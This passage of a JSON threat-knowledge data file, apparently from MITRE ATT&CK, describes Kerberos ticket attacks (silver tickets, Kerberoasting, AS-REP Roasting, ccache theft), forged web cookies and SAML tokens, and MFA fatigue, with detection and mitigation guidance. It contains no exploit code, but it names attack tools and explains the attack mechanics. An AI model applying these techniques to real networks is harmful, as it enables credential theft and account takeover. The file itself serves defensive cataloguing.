golden tickets, adversaries with the ability to forge silver tickets are able to create TGS tickets without interacting with the Key Distribution Center (KDC), potentially making detection more difficult. <a href=\"https://adsecurity.org/?p=1515\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Detecting Forged Tickets)</a>\n\nPassword hashes for target services may be obtained using OS Credential Dumping or Kerberoasting.","detection":"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4634, 4672). <a href=\"https://adsecurity.org/?p=1515\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ADSecurity Detecting Forged Tickets)</a> \n\nMonitor for unexpected processes interacting with lsass.exe. <a href=\"https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium Detecting Attempts to Steal Passwords from Memory)</a> Common credential dumpers such as Mimikatz access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details, including Kerberos tickets, are stored.","platforms":["Windows"],"dataSources":["Logon Session: Logon Session Metadata"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a> Also consider using Group Managed Service Accounts or another third party product such as password vaulting. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"}]},{"id":"T1558.003","name":"Kerberoasting","description":"Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force. <a href=\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Empire InvokeKerberoast Oct 2016)</a> <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a> \n\nService principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service <a href=\"https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detecting Kerberoasting Feb 2018)</a>). <a href=\"https://msdn.microsoft.com/library/ms677949.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SPN)</a> <a href=\"https://social.technet.microsoft.com/wiki/contents/articles/717.service-principal-names-spns-setspn-syntax-setspn-exe.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SetSPN)</a> <a href=\"https://redsiege.com/kerberoast-slides\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Attacking Kerberos Nov 2014)</a> <a href=\"https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Kerberoast Nov 2016)</a>\n\nAdversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). <a href=\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Empire InvokeKerberoast Oct 2016)</a> <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a> Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plaintext credentials. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a> <a href=\"https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Empire InvokeKerberoast Oct 2016)</a> <a href=\"https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Kerberoast Nov 2016)</a>\n\nThis same behavior could be executed using service tickets captured from network traffic. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts. <a href=\"https://redsiege.com/kerberoast-slides\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Attacking Kerberos Nov 2014)</a>","detection":"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17]). <a href=\"https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detecting Kerberoasting Feb 2018)</a> <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Credential Request"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Limit service accounts to minimal required privileges, including membership in privileged groups such as Domain Administrators. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1027","name":"Password Policies","description":"Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a> Also consider using Group Managed Service Accounts or another third party product such as password vaulting. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"}]},{"id":"T1558.004","name":"AS-REP Roasting","description":"Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. <a href=\"https://blog.harmj0y.net/activedirectory/roasting-as-reps/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Roasting AS-REPs Jan 2017)</a> \n\nPreauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password. <a href=\"https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Kerberos Preauth 2014)</a>\n\nFor each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials. <a href=\"https://blog.harmj0y.net/activedirectory/roasting-as-reps/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Roasting AS-REPs Jan 2017)</a> <a href=\"https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)</a> \n\nAn account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. <a href=\"https://blog.harmj0y.net/activedirectory/roasting-as-reps/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Harmj0y Roasting AS-REPs Jan 2017)</a> <a href=\"https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)</a>\n\nCracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts. <a href=\"https://redsiege.com/kerberoast-slides\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Attacking Kerberos Nov 2014)</a>","detection":"Enable Audit Kerberos Service Ticket Operations to log Kerberos TGS service ticket requests. Particularly investigate irregular patterns of activity (ex: accounts making numerous requests, Event ID 4768 and 4769, within a small time frame, especially if they also request RC4 encryption [Type 0x17], pre-authentication not required [Type: 0x0]). <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a> <a href=\"https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Detecting Kerberoasting Feb 2018)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft 4768 TGT 2017)</a>","platforms":["Windows"],"dataSources":["Active Directory: Active Directory Credential Request"],"mitigations":[{"id":"M1027","name":"Password Policies","description":"Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible. <a href=\"https://adsecurity.org/?p=2293\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AdSecurity Cracking Kerberos Dec 2015)</a>"},{"id":"M1047","name":"Audit","description":"Kerberos preauthentication is enabled by default. Older protocols might not support preauthentication therefore it is possible to have this setting disabled. Make sure that all accounts have preauthentication whenever possible and audit changes to setting. Windows tools such as PowerShell may be used to easily find which accounts have preauthentication disabled. <a href=\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961961(v=technet.10)?redirectedfrom=MSDN\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Preauthentication Jul 2012)</a> <a href=\"https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stealthbits Cracking AS-REP Roasting Jun 2019)</a>"}]},{"id":"T1558.005","name":"Ccache Files","description":"Adversaries may attempt to steal Kerberos tickets stored in credential cache files (or ccache). These files are used for short term storage of a user's active session credentials. The ccache file is created upon user authentication and allows for access to multiple services without the user having to re-enter credentials. \n\nThe <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable are used to set the storage location for ccache entries. On Linux, credentials are typically stored in the <code>/tmp</code> directory with a naming format of <code>krb5cc_%UID%</code> or <code>krb5.ccache</code>. On macOS, ccache entries are stored by default in memory with an <code>API:{uuid}</code> naming scheme. Typically, users interact with ticket storage using <code>kinit</code>, which obtains a Ticket-Granting-Ticket (TGT) for the principal; <code>klist</code>, which lists obtained tickets currently held in the credentials cache; and other built-in binaries. <a href=\"https://adepts.of0x.cc/kerberos-thievery-linux/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kerberos GNU/Linux)</a> <a href=\"https://www.binarydefense.com/resources/blog/shining-a-light-in-the-dark-how-binary-defense-uncovered-an-apt-lurking-in-shadows-of-it/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Binary Defense Kerberos Linux)</a>\n\nAdversaries can collect tickets from ccache files stored on disk and authenticate as the current user without their password to perform Pass the Ticket attacks. Adversaries can also use these tickets to impersonate legitimate users with elevated privileges to perform Privilege Escalation. Tools like Kekeo can also be used by adversaries to convert ccache files to Windows format for further Lateral Movement. On macOS, adversaries may use open-source tools or the Kerberos framework to interact with ccache files and extract TGTs or Service Tickets via lower-level APIs. <a href=\"https://posts.specterops.io/when-kirbi-walks-the-bifrost-4c727807744f\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SpectorOps Bifrost Kerberos macOS 2019)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux Kerberos Tickets)</a> <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a> <a href=\"https://github.com/gentilkiwi/kekeo\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kekeo)</a>","detection":"","platforms":["Linux","macOS"],"dataSources":["File: File Access"],"mitigations":[{"id":"M1043","name":"Credential Access Protection","description":"Protect resources with Security Enhanced Linux (SELinux) by defining entry points, process types, and file labels. <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a>"},{"id":"M1047","name":"Audit","description":"Enable and perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses. <a href=\"https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brining MimiKatz to Unix)</a> For example, use <code>auditd</code> to audit access to hashes, machine tickets, or <code>/tmp</code> files. If using sssd and Vintela, ensure kerberos is disabled if not being used. <a href=\"https://github.com/CiscoCXSecurity/linikatz/blob/master/blue/audit/audit.rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: audits linikatz)</a>"}]}]},{"id":"T1606","name":"Forge Web Credentials","description":"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values. <a href=\"https://github.com/pvanbuijtene/aws-adfs-credential-generator\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GitHub AWS-ADFS-Credential-Generator)</a> Adversaries may also forge tokens by taking advantage of features such as the <code>AssumeRole</code> and <code>GetFederationToken</code> APIs in AWS, which allow users to request temporary security credentials (i.e., Temporary Elevated Cloud Access), or the <code>zmprov gdpak</code> command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain. <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_request.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS Temporary Security Credentials)</a> <a href=\"https://wiki.zimbra.com/wiki/Preauth\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Zimbra Preauth)</a>\n\nOnce forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms. <a href=\"https://wunderwuzzi23.github.io/blog/passthecookie.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pass The Cookie)</a> <a href=\"https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Mac Crypto Cookies January 2019)</a> <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a>","detection":"Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","platforms":["SaaS","Windows","macOS","Linux","IaaS","Office Suite","Identity Provider"],"dataSources":["Web Credential: Web Credential Usage","Web Credential: Web Credential Creation","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Ensure that user accounts with administrative rights follow best practices, including use of privileged access workstations, Just in Time/Just Enough Administration (JIT/JEA), and strong authentication. Reduce the number of users that are members of highly privileged Directory Roles. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a> In AWS environments, prohibit users from calling the <code>sts:GetFederationToken</code> API unless explicitly required. <a href=\"https://www.crowdstrike.com/blog/how-adversaries-persist-with-aws-user-federation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike AWS User Federation Persistence)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Restrict permissions and access to the AD FS server to only originate from privileged access workstations. <a href=\"https://www.troopers.de/troopers19/agenda/fpxwmn/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye ADFS)</a>"},{"id":"M1047","name":"Audit","description":"Administrators should perform an audit of all access lists and the permissions they have been granted to access web applications and services. This should be done extensively on all resources in order to establish a baseline, followed up on with periodic audits of new or updated resources. Suspicious accounts/credentials should be investigated and removed.\n \nEnable advanced auditing on ADFS. Check the success and failure audit options in the ADFS Management snap-in. Enable Audit Application Generated events on the AD FS farm via Group Policy Object. <a href=\"https://www.troopers.de/troopers19/agenda/fpxwmn/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye ADFS)</a>"},{"id":"M1054","name":"Software Configuration","description":"Configure browsers/applications to regularly delete persistent web credentials (such as cookies)."}],"subTechniques":[{"id":"T1606.001","name":"Web Cookies","description":"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from Steal Web Session Cookie and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. <a href=\"https://wunderwuzzi23.github.io/blog/passthecookie.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pass The Cookie)</a> The generation of web cookies often requires secret values, such as passwords, Private Keys, or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources (Web Session Cookie), which may bypass multi-factor and other authentication protection mechanisms. <a href=\"https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity SolarWinds)</a> <a href=\"https://wunderwuzzi23.github.io/blog/passthecookie.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Pass The Cookie)</a> <a href=\"https://unit42.paloaltonetworks.com/mac-malware-steals-cryptocurrency-exchanges-cookies/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Mac Crypto Cookies January 2019)</a>","detection":"Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","platforms":["Linux","macOS","Windows","SaaS","IaaS"],"dataSources":["Logon Session: Logon Session Creation","Web Credential: Web Credential Usage"],"mitigations":[{"id":"M1047","name":"Audit","description":"Administrators should perform an audit of all access lists and the permissions they have been granted to access web applications and services. This should be done extensively on all resources in order to establish a baseline, followed up on with periodic audits of new or updated resources. Suspicious accounts/credentials should be investigated and removed."},{"id":"M1054","name":"Software Configuration","description":"Configure browsers/applications to regularly delete persistent web cookies."}]},{"id":"T1606.002","name":"SAML Tokens","description":"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. <a href=\"https://blogs.microsoft.com/on-the-issues/2020/12/13/customers-protect-nation-state-cyberattacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Steps)</a> The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>. <a href=\"https://docs.microsoft.com/en-us/azure/active-directory/develop/active-directory-configurable-token-lifetimes\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SAML Token Lifetimes)</a> Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism. <a href=\"https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cyberark Golden SAML)</a>\n\nAn adversary may utilize Private Keys to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a> This differs from Steal Application Access Token and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Entra ID privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to Use Alternate Authentication Material, which may bypass multi-factor and other authentication protection mechanisms. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a>","detection":"This technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a> Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain. <a href=\"https://www.sygnia.co/golden-saml-advisory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Golden SAML)</a>\n\nConsider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests. <a href=\"https://www.sygnia.co/golden-saml-advisory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sygnia Golden SAML)</a>","platforms":["SaaS","Windows","IaaS","Office Suite","Identity Provider"],"dataSources":["Web Credential: Web Credential Usage","Web Credential: Web Credential Creation","Logon Session: Logon Session Creation","User Account: User Account Authentication","Logon Session: Logon Session Metadata","Process: Process Creation"],"mitigations":[{"id":"M1015","name":"Active Directory Configuration","description":"For containing the impact of a previously forged SAML token, rotate the token-signing AD FS certificate in rapid succession twice, which will invalidate any tokens generated using the previous certificate. <a href=\"https://www.mandiant.com/resources/blog/remediation-and-hardening-strategies-for-microsoft-365-to-defend-against-unc2452\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Defend UNC2452 White Paper)</a>"},{"id":"M1018","name":"User Account Management","description":"Ensure that user accounts with administrative rights follow best practices, including use of privileged access workstations, Just in Time/Just Enough Administration (JIT/JEA), and strong authentication. Reduce the number of users that are members of highly privileged Directory Roles. <a href=\"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SolarWinds Customer Guidance)</a>"},{"id":"M1026","name":"Privileged Account Management","description":"Restrict permissions and access to the AD FS server to only originate from privileged access workstations. <a href=\"https://www.troopers.de/troopers19/agenda/fpxwmn/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye ADFS)</a>"},{"id":"M1047","name":"Audit","description":"Enable advanced auditing on AD FS. Check the success and failure audit options in the AD FS Management snap-in. Enable Audit Application Generated events on the AD FS farm via Group Policy Object. <a href=\"https://www.troopers.de/troopers19/agenda/fpxwmn/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye ADFS)</a>"}]}]},{"id":"T1621","name":"Multi-Factor Authentication Request Generation","description":"Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.\n\nAdversaries in possession of credentials to Valid Accounts may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR). <a href=\"https://www.obsidiansecurity.com/blog/behind-the-breach-self-service-password-reset-azure-ad/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Obsidian SSPR Abuse 2023)</a>\n\nIn some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.” <a href=\"https://therecord.media/russian-hackers-bypass-2fa-by-annoying-victims-with-repeated-push-notifications/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Russian 2FA Push Annoyance - Cimpanu)</a> <a href=\"https://portswigger.net/daily-swig/mfa-fatigue-attacks-users-tricked-into-allowing-device-access-due-to-overload-of-push-notifications\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MFA Fatigue Attacks - PortSwigger)</a> <a href=\"https://www.mandiant.com/resources/russian-targeting-gov-business\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)</a>","detection":"Monitor user account logs as well as 2FA/MFA application logs for suspicious events: unusual login attempt source location, mismatch in location of login attempt and smart device receiving 2FA/MFA request prompts, and high volume of repeated login attempts, all of which may indicate user's primary credentials have been compromised minus 2FA/MFA mechanism.","platforms":["Windows","Linux","macOS","IaaS","SaaS","Office Suite","Identity Provider"],"dataSources":["User Account: User Account Authentication","Logon Session: Logon Session Metadata","Application Log: Application Log Content","Logon Session: Logon Session Creation"],"mitigations":[{"id":"M1017","name":"User Training","description":"Train users to only accept 2FA/MFA requests from login attempts they initiated, to review source location of the login attempt prompting the 2FA/MFA requests, and to report suspicious/unsolicited prompts."},{"id":"M1032","name":"Multi-factor Authentication","description":"Implement more secure 2FA/MFA mechanisms in replacement of simple push or one-click 2FA/MFA options. For example, having users enter a one-time code provided by the login screen into the 2FA/MFA application or utilizing other out-of-band 2FA/MFA mechanisms (such as rotating code-based hardware tokens providing rotating codes that need an accompanying user pin) may be more secure. Furthermore, change default configurations and implement limits upon the maximum number of 2FA/MFA request prompts that can be sent to users in period of time. <a href=\"https://portswigger.net/daily-swig/mfa-fatigue-attacks-users-tricked-into-allowing-device-access-due-to-overload-of-push-notifications\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MFA Fatigue Attacks - PortSwigger)</a>"},{"id":"M1036","name":"Account Use Policies","description":"Enable account restrictions to prevent login attempts, and the subsequent 2FA/MFA service requests, from being initiated from suspicious locations or when the source of the login attempts do not match the location of the 2FA/MFA smart device. Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges. <a href=\"https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-conditional-access-policy-common\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Common Conditional Access Policies)</a>"}],"subTechniques":[]},{"id":"T1649","name":"Steal or Forge Authentication 